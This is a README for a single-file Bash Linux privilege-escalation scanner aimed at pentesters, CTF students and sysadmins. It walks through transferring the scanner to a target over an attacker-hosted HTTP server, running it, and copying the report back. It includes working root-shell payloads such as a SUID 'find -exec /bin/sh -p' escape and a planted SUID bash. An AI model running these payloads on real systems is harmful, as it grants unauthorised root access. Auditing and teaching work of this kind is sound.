# 📖 README — LPE-Scanner

# LPE-Scanner (LinPEAS-Lite)

**An advanced, single-file Linux privilege escalation scanner written in Bash.**

LPE-Scanner audits a Linux host for common privilege-escalation misconfigurations and, for every finding, prints the **exact exploit payload** you can copy-paste to verify it. It supports remote lookups against the official [GTFOBins](https://gtfobins.github.io/) API so that SUID and sudo findings always come with the correct, up-to-date exploit syntax.

> ⚠️ **Legal Notice**
> This tool is intended **strictly** for educational purposes and **authorized** penetration testing. Running it against systems you do not own or have explicit written permission to test is **illegal** and may result in criminal prosecution. The author assumes no liability for misuse.

---

## 🎯 Who Is This Tool For?


| Audience                              | How You'll Use It                                                                                                                                                                 |
| ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Penetration testers / Red teamers** | Post-exploitation phase — after gaining initial SSH access to a low-privileged user, run the scanner to enumerate privesc vectors in seconds.                                    |
| **CTF / HTB / OSCP students**         | Fast privilege-escalation enumeration on boot2root boxes. Every VULN line is a copy-paste payload, so you can go from finding to shell in one move.                               |
| **Blue team / Sysadmins**             | Audit your own fleet for dangerous SUID binaries, misconfigured sudoers, world-writable system files, and unpatched kernel/pkexec versions. Run it in CI or as part of hardening. |
| **Students / Learners**               | Understand*how* Linux privesc works by reading the module code — each check is small, readable, and documented.                                                                  |
| **Bug bounty hunters**                | On-scope post-auth enumeration of Linux attack surfaces.                                                                                                                          |

**Who it's *not* for:** absolute beginners with no shell experience, or anyone intending to attack systems they don't own. If you don't already understand what `SUID`, `sudo -l`, or `cron` mean, read up on the basics first — otherwise the output will just be a wall of colors.

---

## ✨ Features

- **Single-file Bash script** — no Python runtime, no package installs, no dependencies beyond coreutils and (optionally) `curl` + `python3` for GTFOBins lookups.
- **11 modules** covering the vast majority of Linux privesc vectors.
- **Copy-paste exploit payload** printed next to every finding.
- **GTFOBins remote lookup** — dynamically fetches the official JSON API so payloads for `sudo` and `suid` contexts are always current.
- **Kernel CVE mapping** — flags DirtyCow, CVE-2017-16995, CVE-2021-4034 (PwnKit), and more based on `uname -r`.
- **Container-escape detection** — flags `docker`, `lxd`, and `disk` group membership.
- **Color-coded output** — red = vulnerability, green = payload, cyan = info, yellow = warning.
- **Report export** — tee everything to a file for later review.

### Modules


| #  | Module                         | What It Checks                                                                                                      |
| -- | ------------------------------ | ------------------------------------------------------------------------------------------------------------------- |
| 1  | **Sudo misconfigurations**     | `sudo -l` parsing, `NOPASSWD` entries, GTFOBins lookup                                                              |
| 2  | **SUID binaries**              | `find / -perm -4000`, matched against dangerous binaries                                                            |
| 3  | **Linux capabilities**         | `getcap -r /` — flags `cap_setuid`, `cap_dac_read_search`                                                          |
| 4  | **Sensitive file permissions** | Writable`/etc/passwd`, `/etc/sudoers`, readable `/etc/shadow`, plus a curated allowlist of dangerous writable paths |
| 5  | **Cron jobs**                  | Writable cron files and directories, writable scripts invoked by cron, wildcard injection                           |
| 6  | **Kernel version**             | Maps`uname -r` to known CVEs                                                                                        |
| 7  | **Services & containers**      | `docker` / `lxd` / `disk` group membership, writable systemd units                                                  |
| 8  | **PATH / env hijack**          | Writable directories in`$PATH`, `.` in `$PATH`                                                                      |
| 9  | **Writable system binaries**   | Files in`/usr/bin`, `/usr/sbin`, `/bin`, `/sbin` writable by your user                                              |
| 10 | **Password hunt**              | Greps`/var/www`, `/home`, `/etc`, `/opt`, `/srv` for plaintext credentials                                          |
| 11 | **GTFOBins remote lookup**     | Fetches`https://gtfobins.org/api.json` for the correct sudo/suid payload                                            |

---

## 📦 Requirements


| Requirement               | Notes                                                                                |
| ------------------------- | ------------------------------------------------------------------------------------ |
| **Bash 4.0+**             | Preinstalled on every modern Linux distro                                            |
| **coreutils / findutils** | Preinstalled                                                                         |
| **`curl`**                | Only needed for GTFOBins remote lookup (optional)                                    |
| **`python3`**             | Only needed for GTFOBins JSON parsing (optional — falls back to hardcoded payloads) |
| **`getcap`**              | Ships with`libcap2-bin` on Debian/Ubuntu; also preinstalled on Kali                  |

If `curl` or `python3` is absent, the tool still works — GTFOBins lookups are silently skipped and the built-in payload table is used instead.

---

## 🚀 Installation

```bash
# 1. Download
git clone https://github.com/Novicer18/user2root-LPE
cd user2root-LPE

# Or just drop the single file
curl -fsSL https://raw.githubusercontent.com/yourname/lpe-scanner/main/lpe-scanner.sh -o lpe-scanner.sh
chmod +x lpe-scanner.sh

# 2. Verify syntax (optional)
bash -n lpe-scanner.sh
```

---

## 🧭 Usage Process

### Step 1 — Get a low-privileged shell on the target

You've gained SSH access as a normal user (e.g., `whitehat@10.10.10.5`). **Do not** run the scanner as `root` — as root, every writable-file check trivially returns `true` and your VULN count explodes to tens of thousands of false positives.

```bash
# Confirm you're low-priv
id
# uid=1001(whitehat) gid=1001(whitehat) groups=1001(whitehat)
```

If `id -u` returns `0`, log out and use a non-root account.

### Step 2 — Transfer the scanner to the target

```bash
# From your attacking machine
scp lpe-scanner.sh whitehat@10.10.10.5:/tmp/
ssh whitehat@10.10.10.5 'chmod +x /tmp/lpe-scanner.sh'
```

If `scp` isn't available, use `nc`, `base64 -d`, or host the file over HTTP:

```bash
# On attacker
python3 -m http.server 8000

# On target
wget http://10.10.10.1:8000/lpe-scanner.sh -O /tmp/lpe-scanner.sh
chmod +x /tmp/lpe-scanner.sh
```

### Step 3 — Run the scan

```bash
# Basic run — prints to terminal
/tmp/lpe-scanner.sh

# With a saved report
/tmp/lpe-scanner.sh -o /tmp/report.txt

# Quiet mode — just show the payloads
/tmp/lpe-scanner.sh 2>/dev/null | grep -A1 "VULN"
```

**Run as your low-priv user.** Do **not** `sudo` it. The whole point is to see what *that user* can do.

### Step 4 — Review the findings

The scanner exits with a **summary block** like this:

```
╔══════════════════════════════════════════════════════════╗
║                    SCAN SUMMARY                          ║
╚══════════════════════════════════════════════════════════╝
  Vulnerabilities found : 4
  Informational items   : 12
  Report saved to       : /tmp/report.txt
```

A clean Kali box should show **0–3 vulnerabilities**. If you see hundreds, re-read the "Troubleshooting" section — you're likely running as root.

### Step 5 — Exploit the findings

Each VULN line includes a copy-paste payload. Example:

```
[!] VULN: SUID find: /usr/bin/find
    ├─ Payload: /usr/bin/find . -exec /bin/sh -p \; -quit
```

Copy the payload, paste it into your shell, and verify the escalation:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

That's a confirmed privilege escalation. If a payload doesn't work, cross-check it against [GTFOBins](https://gtfobins.github.io/) — the local binary may have been patched.

### Step 6 — Save the report to your attacking machine

```bash
# On the target
cat /tmp/report.txt | base64 -w0 > /tmp/report.b64

# On attacker
scp whitehat@10.10.10.5:/tmp/report.b64 .
base64 -d report.b64 > report.txt
```

---

## 🧪 Positive-Control Test (Verify the Scanner Works)

To prove the scanner correctly detects a privesc vector, deliberately plant one:

```bash
# As root on a test VM
sudo cp /bin/bash /tmp/suidbash
sudo chmod +s /tmp/suidbash

# As your low-priv user
/tmp/lpe-scanner.sh | grep suidbash
```

Expected output:

```
[!] VULN: SUID shell: /tmp/suidbash
    ├─ Payload: /tmp/suidbash -p
```

If you don't see this, the SUID module is broken — stop and debug before trusting the tool.

Clean up after yourself:

```bash
sudo rm -f /tmp/suidbash
```

---

## 🧩 Command-Line Reference

```
Usage: ./lpe-scanner.sh [-o output.txt]

Options:
  -o <file>     Save the full scan report to <file> (tee'd to stdout)
  -h, --help    Show help

Environment:
  (none)
```

---

## 🛠 Troubleshooting

### ❗ "Vulnerabilities found: 4865" — you're running as root

**Cause:** every `-writable` check succeeds for root.

**Fix:** create a low-priv user and re-run.

```bash
sudo useradd -m -s /bin/bash testuser
sudo passwd testuser
su - testuser
/tmp/lpe-scanner.sh
```

### ❗ "GTFOBins API download failed"

The target has no outbound internet access, or `curl` isn't installed. The scanner **automatically falls back** to the built-in payload table, so this is only a cosmetic warning.

### ❗ `/usr/bin/find` shows up as a SUID binary

That's almost certainly a symlink or a container mount you don't actually need to worry about. Cross-check:

```bash
ls -la /usr/bin/find
stat -c '%A %U %n' /usr/bin/find
```

If it's not `-rwsr-xr-x root root`, it's not exploitable.

### ❗ PwnKit false positive

Versions of `pkexec` **≥ 0.120** are patched. The scanner compares the extracted version number against `0.120` and skips higher versions. If you still get a PwnKit hit on a patched system, check:

```bash
/usr/bin/pkexec --version
# pkexec version 127   ← patched, ignore the finding
```

### ❗ Writable `/etc/apparmor.d/*` files flagged

AppArmor profile files are *meant* to be writable by `root`, and are not exploitable on their own. The scanner's file check has been narrowed to a curated allowlist (`/etc/passwd`, `/etc/sudoers`, cron dirs, systemd units, PAM, etc.) so these won't appear unless you're root. If they still appear, verify your file version matches the one in this repo.

---

## 🗺 Roadmap

- [ ]  Add MySQL/PostgreSQL UDF credential check
- [ ]  Add NFS `no_root_squash` detection via `showmount -e localhost`
- [ ]  Add `pkexec` version parse to remove false positives
- [ ]  Add optional `--json` output for integration with other tooling
- [ ]  Add `--no-network` flag to force offline mode for air-gapped targets

---

## 🤝 Contributing

Pull requests welcome. Each module is a small, self-contained function (`check_sudo`, `check_suid`, etc.) — to add a new check, write a function and call it from `main()`. Keep each module under ~80 lines and always print a payload, never just a finding.

---

## 📜 License

MIT License — see `LICENSE` for details.

---

## 🙏 Acknowledgements

- [GTFOBins](https://gtfobins.github.io/) — the canonical database of SUID / sudo / shell-escape exploits
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) — the reference implementation that this tool is intentionally a lighter, single-file counterpart to
- [PayloadsAllTheThings — Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

---

> **Final reminder:** Only run this on machines you **own** or have **explicit written permission** to test. Use it as a learning tool to understand how misconfigurations become root shells — then go **fix** those misconfigurations on your own systems.
>
